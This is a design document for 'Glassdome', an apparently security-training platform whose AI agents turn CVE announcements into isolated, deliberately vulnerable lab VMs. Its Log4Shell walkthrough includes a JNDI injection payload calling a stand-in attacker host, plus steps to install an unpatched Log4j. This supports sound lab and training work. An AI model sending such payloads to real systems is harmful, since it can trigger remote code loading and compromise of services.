# Glassdome Complete Architecture - Autonomous Vulnerability Research & Emulation Platform

## System Overview

Glassdome is a **research-grade autonomous platform** that can take CVE announcements and automatically create exploitable lab environments for security training, testing, and research - with minimal human intervention.

---

## Complete Agent Pipeline

```
┌──────────────────────────────────────────────────────────────────┐
│                     CVE TRACKING PROJECT                          │
│                   (External - Your Existing)                      │
│  • Monitors CVE feeds (NVD, vendor advisories)                   │
│  • Tracks severity, affected products                            │
│  • Triggers Glassdome on high-priority CVEs                      │
└───────────────────────────┬──────────────────────────────────────┘
                            │
                            │ New CVE Event
                            │ (CVE-2024-XXXXX)
                            ↓
┌──────────────────────────────────────────────────────────────────┐
│                      RESEARCH AGENT (AI-Powered)                  │
│ ──────────────────────────────────────────────────────────────── │
│ Phase 1: CVE Analysis                                            │
│  • Fetch from NVD (National Vulnerability Database)              │
│  • Parse description, CVSS, affected software                    │
│  • AI extracts: vulnerability type, attack vector                │
│                                                                   │
│ Phase 2: Exploit Research                                        │
│  • Search GitHub for PoC code                                    │
│  • Search Exploit-DB for exploits                                │
│  • Scrape security blogs/advisories                              │
│  • Rank sources by reliability                                   │
│                                                                   │
│ Phase 3: Exploitation Analysis                                   │
│  • AI analyzes exploit code                                      │
│  • Extracts exploitation steps                                   │
│  • Identifies prerequisites                                      │
│  • Generates validation method                                   │
│                                                                   │
│ Phase 4: Deployment Procedure Generation                         │
│  • AI converts to automated steps                                │
│  • VM requirements (OS, memory, network)                         │
│  • Software installation commands                                │
│  • Configuration changes needed                                  │
│  • Validation and safety checks                                  │
│                                                                   │
│ Phase 5: Validation                                              │
│  • Test in isolated environment                                  │
│  • Verify vulnerability is exploitable                           │
│  • Safety checks (no malware, isolated)                          │
│                                                                   │
│ Output: Deployment Procedure Document                            │
└───────────────────────────┬──────────────────────────────────────┘
                            │
                            │ Validated Procedure
                            ↓
┌──────────────────────────────────────────────────────────────────┐
│                  ORCHESTRATOR (Lab Manager)                       │
│ ──────────────────────────────────────────────────────────────── │
│  • Parses deployment procedure                                   │
│  • Determines VM requirements                                    │
│  • Allocates resources                                           │
│  • Coordinates agent deployment                                  │
│  • Manages network isolation                                     │
└───────────────────────────┬──────────────────────────────────────┘
                            │
                ┌───────────┴────────────┐
                │                        │
                ↓                        ↓
┌───────────────────────┐   ┌────────────────────────┐
│   UBUNTU AGENT        │   │  REAPER AGENT          │
│ ───────────────────── │   │ ────────────────────── │
│ Step 1: Deploy VM     │   │ Step 2: Inject Vuln    │
│  • Clone template     │   │  • Install vulnerable  │
│  • Configure RAM/CPU  │   │    software version    │
│  • Network setup      │   │  • Apply misconfig     │
│  • Start VM (10s)     │   │  • Skip security       │
│                       │   │    patches             │
│ Step 2: Cloud-Init    │   │  • Plant CTF flags     │
│  • Create users       │   │  • Generate answer key │
│  • Install packages   │   │  • Validate exploit    │
│  • SSH keys           │   │                        │
│  • Base config        │   │ Uses:                  │
│                       │   │  • SSH commands        │
│ Outputs:              │   │  • Config file edits   │
│  • VM ID: 100         │   │  • Package installs    │
│  • IP: 192.168.3.50   │   │  • Service restarts    │
│  • Status: Running    │   │                        │
└───────────┬───────────┘   └────────────┬───────────┘
            │                            │
            └────────────┬───────────────┘
                         │
                         │ Lab Ready
                         ↓
┌──────────────────────────────────────────────────────────────────┐
│                     OVERSEER AGENT (Monitoring)                   │
│ ──────────────────────────────────────────────────────────────── │
│  • Monitors VM health (CPU, memory, status)                      │
│  • Tracks student progress (if training scenario)                │
│  • Detects issues (VM crash, network problems)                   │
│  • Generates alerts                                              │
│  • Auto-remediation (restart crashed VMs)                        │
│  • Usage metrics (deployment time, success rate)                 │
└───────────────────────────┬──────────────────────────────────────┘
                            │
                            │ Lab Status & Metrics
                            ↓
┌──────────────────────────────────────────────────────────────────┐
│                     FRONTEND (React Dashboard)                    │
│ ──────────────────────────────────────────────────────────────── │
│  View 1: CVE Library                                             │
│   • Browse researched CVEs                                       │
│   • Deploy labs with one click                                   │
│   • View exploitation details                                    │
│                                                                   │
│  View 2: Active Labs                                             │
│   • Real-time lab monitoring                                     │
│   • VM health dashboards                                         │
│   • Student progress (if training)                               │
│                                                                   │
│  View 3: Custom Scenarios                                        │
│   • Drag-and-drop lab designer                                   │
│   • Combine multiple vulnerabilities                             │
│   • Create attack chains                                         │
│                                                                   │
│  View 4: Metrics & Analytics                                     │
│   • Deployment statistics                                        │
│   • Cost tracking (Proxmox vs Azure vs AWS)                      │
│   • Success rates                                                │
└──────────────────────────────────────────────────────────────────┘
```

---

## Agent Responsibilities

### 1. Research Agent (AI-Powered) 🧠
**Purpose:** Autonomous vulnerability research and procedure generation

**Inputs:**
- CVE ID (e.g., CVE-2024-1234)
- Research depth (quick, standard, deep)

**Outputs:**
- Vulnerability summary
- Exploitation procedure
- Deployment steps
- Validation method
- Answer key
- Mitigation steps

**Technologies:**
- OpenAI GPT-4 / Anthropic Claude
- NVD API
- GitHub API
- Exploit-DB scraping
- Web scraping (security blogs)

**Autonomy Level:** HIGH (minimal human intervention)

---

### 2. Orchestrator (Lab Manager) 🎭
**Purpose:** Coordinate multi-agent deployment

**Responsibilities:**
- Parse deployment procedures
- Allocate resources
- Sequence agent actions
- Handle dependencies
- Manage networks
- Track deployments

**Technologies:**
- FastAPI (Python)
- Celery (task queue)
- Redis (state management)
- SQLAlchemy (database)

**Autonomy Level:** HIGH (fully automated)

---

### 3. Ubuntu Agent (Clean VM Deployment) 🖥️
**Purpose:** Deploy base operating system VMs

**Responsibilities:**
- Clone templates
- Configure resources
- Network setup
- Cloud-init execution
- User/package setup

**Technologies:**
- Proxmox API
- Azure SDK
- AWS SDK
- Cloud-init
- SSH

**Autonomy Level:** FULL (no human intervention)

---

### 4. Reaper Agent (Vulnerability Injection) ⚡
**Purpose:** Transform clean VMs into vulnerable training environments

**Responsibilities:**
- Install vulnerable software versions
- Apply misconfigurations
- Plant CTF flags
- Generate answer keys
- Validate exploitability
- Document procedures

**Technologies:**
- SSH (Paramiko)
- Ansible (configuration)
- Custom vulnerability modules
- Safety validators

**Autonomy Level:** HIGH (uses Research Agent procedures)

**Safety:**
- Network isolation enforced
- No actual malware
- Reversible changes
- Human approval for CVSS 9.0+

---

### 5. Overseer Agent (Monitoring & Remediation) 👁️
**Purpose:** Monitor infrastructure and handle issues

**Responsibilities:**
- Health monitoring (CPU, memory, disk)
- Student progress tracking
- Issue detection
- Alert generation
- Auto-remediation
- Metrics collection

**Technologies:**
- Prometheus (metrics)
- Grafana (dashboards)
- Proxmox monitoring
- SSH health checks

**Autonomy Level:** FULL (continuous operation)

---

## Data Flow Example: Log4Shell (CVE-2021-44228)

### Timeline

```
T+0min:  CVE announced in CVE Tracker Project
T+0min:  Research Agent triggered
T+5min:  CVE data fetched from NVD
T+10min: 3 GitHub PoCs found and analyzed
T+15min: AI generates exploitation procedure
T+20min: Deployment procedure created
T+25min: Validation in test environment
T+30min: Procedure approved, ready for deployment
─────────────────────────────────────────────────────
T+30min: User clicks "Deploy Lab" in frontend
T+31min: Orchestrator allocates resources
T+32min: Ubuntu Agent deploys clean VM
T+33min: Cloud-init installs Java 11, Maven
T+35min: Reaper Agent installs Log4j 2.14.0
T+37min: Reaper deploys vulnerable web app
T+38min: Reaper plants JNDI payload tester
T+39min: Reaper validates RCE is possible
T+40min: Lab ready for testing!
─────────────────────────────────────────────────────
TOTAL TIME: CVE announced → Exploitable lab = 40 minutes
```

### Data Passed Between Agents

```json
{
  "cve_id": "CVE-2021-44228",
  "research_output": {
    "vulnerability_type": "Remote Code Execution",
    "affected_software": "Apache Log4j 2.x",
    "affected_versions": ["2.0-beta9", "2.14.1"],
    "cvss_score": 10.0,
    "exploitation_method": "JNDI injection via log message",
    "deployment_procedure": {
      "vm_requirements": {
        "os": "Ubuntu 20.04",
        "memory": 2048,
        "cores": 2,
        "network": "isolated"
      },
      "installation": [
        "apt-get install -y openjdk-11-jdk maven",
        "wget https://archive.apache.org/.../log4j-2.14.0.tar.gz",
        "tar -xzf log4j-2.14.0.tar.gz",
        "git clone https://github.com/vulnerable-app.git",
        "mvn clean package"
      ],
      "vulnerability_introduction": {
        "method": "Use Log4j 2.14.0 (vulnerable version)",
        "do_not_patch": "Do NOT upgrade to 2.15.0+",
        "configuration": "Enable JNDI lookups (default)"
      },
      "validation": {
        "payload": "${jndi:ldap://attacker.com/a}",
        "expected": "DNS lookup to attacker.com",
        "verification": "netcat listener receives connection"
      },
      "flags": [
        {
          "name": "flag1",
          "location": "/opt/app/logs/flag1.txt",
          "value": "FLAG{log4shell_is_critical}"
        }
      ]
    }
  },
  "deployment_result": {
    "vm_id": 101,
    "vm_ip": "192.168.3.51",
    "hostname": "log4shell-lab-001",
    "web_url": "http://192.168.3.51:8080",
    "ssh_access": "ubuntu@192.168.3.51",
    "status": "vulnerable_and_ready",
    "deployment_time": 600,
    "validation_result": "exploit_successful"
  },
  "instructor_materials": {
    "answer_key_url": "https://glassdome/labs/CVE-2021-44228/answer-key",
    "student_guide_url": "https://glassdome/labs/CVE-2021-44228/student-guide",
    "detection_guide": "Look for: JNDI lookups in logs, DNS to unusual domains"
  }
}
```

---

## Platform Integrations

### CVE Tracker Project (Your Existing)
- **Direction:** CVE Tracker → Glassdome
- **Data:** CVE IDs, severity, affected products
- **Trigger:** New high-priority CVE
- **Response:** Glassdome researches and deploys lab

### Cloud Providers
- **Proxmox:** On-prem deployment, template management
- **Azure:** Cloud deployment, auto-scaling
- **AWS:** Cloud deployment, cost optimization

### AI Providers
- **OpenAI:** GPT-4 for vulnerability analysis
- **Anthropic:** Claude for procedure generation
- **Local LLM:** Privacy-sensitive research (optional)

### Security Data Sources
- **NVD:** Official CVE data
- **GitHub:** Proof-of-concept exploits
- **Exploit-DB:** Known exploits
- **Security Blogs:** Analysis and techniques

---

## Deployment Scenarios

### Scenario 1: Training Lab (Pre-Built)
**Use Case:** Instructor wants Web Security lab for class

**Flow:**
1. Instructor browses lab library in frontend
2. Selects "Web Security Training" template
3. Clicks "Deploy"
4. Orchestrator → Ubuntu Agent → Reaper Agent
5. Lab ready in 3-5 minutes
6. Students access via web UI
7. Overseer tracks progress
8. Instructor can reset between classes

**Time:** 3-5 minutes
**Autonomy:** 100% (no human intervention)

---

### Scenario 2: New CVE Emulation (Autonomous)
**Use Case:** New critical CVE announced, need test environment ASAP

**Flow:**
1. CVE Tracker detects new CVE (CVSS 9.5)
2. Triggers Research Agent
3. Research Agent:
   - Fetches CVE data
   - Finds PoCs on GitHub
   - Analyzes exploitation
   - Generates procedure (30 min)
4. Security team reviews procedure
5. Approves deployment
6. Orchestrator → Ubuntu Agent → Reaper Agent
7. Lab ready for testing

**Time:** 30-60 minutes (research) + 5 minutes (deploy)
**Autonomy:** 90% (human approval for high-risk)

---

### Scenario 3: Custom Attack Chain
**Use Case:** Red team wants multi-step attack scenario

**Flow:**
1. Red team uses frontend drag-and-drop
2. Designs 3-VM attack chain:
   - VM1: Web server (SQLi)
   - VM2: File server (SMB misconfiguration)
   - VM3: Domain controller (privilege escalation)
3. Clicks "Deploy"
4. Orchestrator coordinates:
   - Creates isolated network
   - Deploys 3 VMs in parallel
   - Reaper injects vulnerabilities
   - Configures attack path
5. Red team practices lateral movement

**Time:** 10-15 minutes (3 VMs)
**Autonomy:** 100% (template-based)

---

### Scenario 4: Blue Team Detection Training
**Use Case:** SOC team needs to practice detecting attacks

**Flow:**
1. Select "Network Intrusion Detection" scenario
2. Orchestrator deploys:
   - 1 vulnerable server (target)
   - 1 attacker VM (automated scripts)
   - 1 SIEM/monitoring VM (Security Onion)
3. Attacker VM runs scripted attacks
4. Blue team monitors SIEM
5. Practice: detection, analysis, response
6. Overseer tracks what they find

**Time:** 5-7 minutes (3 VMs + monitoring)
**Autonomy:** 100% (scripted attacks)

---

## Technology Stack

### Backend
- **Language:** Python 3.11+
- **Framework:** FastAPI
- **Task Queue:** Celery + Redis
- **Database:** PostgreSQL
- **ORM:** SQLAlchemy + Alembic
- **API Client:** Proxmoxer, Azure SDK, Boto3
- **SSH:** Paramiko
- **AI:** OpenAI API, Anthropic API

### Frontend
- **Framework:** React 18
- **Routing:** React Router
- **State:** React Context / Redux
- **UI:** Custom components + drag-and-drop (dnd-kit)
- **Charts:** Recharts / D3.js
- **HTTP:** Axios

### Infrastructure
- **Containers:** Docker + Docker Compose
- **Orchestration:** (Future) Kubernetes
- **Monitoring:** Prometheus + Grafana
- **Logging:** Structured logs (structlog)
- **Secrets:** Environment variables + Vault (future)

### Deployment
- **On-Prem:** Proxmox VE 8.x
- **Cloud:** Azure, AWS
- **CI/CD:** GitHub Actions (future)

---

## Security Architecture

### Isolation Layers

1. **Network Isolation**
   - Vulnerable VMs in separate VLAN
   - No internet access
   - Firewall rules prevent escape
   - Monitoring on all traffic

2. **Access Controls**
   - Role-based access (instructor, student, admin)
   - API authentication (JWT)
   - SSH key-based only
   - Audit logging

3. **Resource Limits**
   - VM quotas per user
   - CPU/memory limits
   - Disk quotas
   - Auto-cleanup after TTL

4. **Safety Validation**
   - No actual malware deployment
   - Procedure review for high-risk CVEs
   - Automated safety checks
   - Emergency kill switch

---

## Competitive Advantages

### 1. Autonomous CVE Emulation
**No competitor does this:**
- AI researches new CVEs automatically
- Generates deployment procedures
- Creates labs in < 1 hour from CVE announcement
- **Market Differentiator**

### 2. Multi-Cloud
**Most are single-platform:**
- Glassdome: Proxmox + Azure + AWS
- Competitors: Single cloud or proprietary hardware
- **Flexibility Advantage**

### 3. Self-Hosted + Open Source
**Most are SaaS only:**
- Glassdome: Deploy anywhere
- No per-seat licensing
- Full data control
- **Cost Advantage: $50K/year → $5K/year**

### 4. Customizable
**Most are curated content:**
- Glassdome: Create ANY scenario
- Drag-and-drop lab designer
- Custom vulnerability combinations
- **Flexibility Advantage**

### 5. Research-Grade
**Most are training-focused:**
- Glassdome: Research + Training + Testing
- Patch validation
- CVE impact assessment
- **Enterprise Use Case**

---

## ROI Calculation

### Traditional Approach (Manual)
- **Setup Time:** 2-8 hours per lab
- **Expertise Required:** Senior security engineer ($150/hr)
- **Cost per Lab:** $300-1,200
- **Yearly Cost (50 labs):** $15,000-60,000
- **Platform Fees:** $50,000/year (Cyber Range)
- **Total Annual Cost:** $65,000-110,000

### Glassdome Approach (Autonomous)
- **Setup Time:** 3-10 minutes per lab (automated)
- **Expertise Required:** None (AI handles it)
- **Cost per Lab:** ~$2 (compute time)
- **Yearly Cost (500 labs):** $1,000
- **Platform Fees:** $0 (self-hosted)
- **Infrastructure:** $5,000/year (servers)
- **Total Annual Cost:** $6,000

### **Annual Savings: $59,000-104,000 (90-95% reduction)**

---

## Scalability

### Current Capacity (Single Proxmox Host)
- 10-20 concurrent labs
- 30-60 VMs
- 100-200 users

### Scaled Capacity (Cluster + Cloud)
- 100+ concurrent labs
- 300-1000 VMs
- 1000+ users
- Auto-scaling in Azure/AWS

---

## Future Roadmap

### Q1 2025
- ✅ Core agents (Ubuntu, Reaper, Overseer)
- ✅ Research Agent (AI-powered CVE analysis)
- ✅ Proxmox integration
- ✅ Basic frontend

### Q2 2025
- Azure deployment
- AWS deployment  
- Advanced attack chains
- Competition mode (CTF hosting)

### Q3 2025
- AI-generated attack scenarios
- Community scenario marketplace
- Windows VM support
- Advanced networking

### Q4 2025
- Red vs Blue team competitions
- Real-time collaboration
- Advanced AI (multi-step exploits)
- Enterprise features (SSO, compliance)

---

## This Is Unique

**No other platform combines:**
1. ✅ Autonomous AI vulnerability research
2. ✅ Automated vulnerable environment deployment
3. ✅ Multi-cloud support
4. ✅ Self-hosted + open source
5. ✅ Research-grade + training-grade

**Glassdome is a category-defining platform.**

🚀

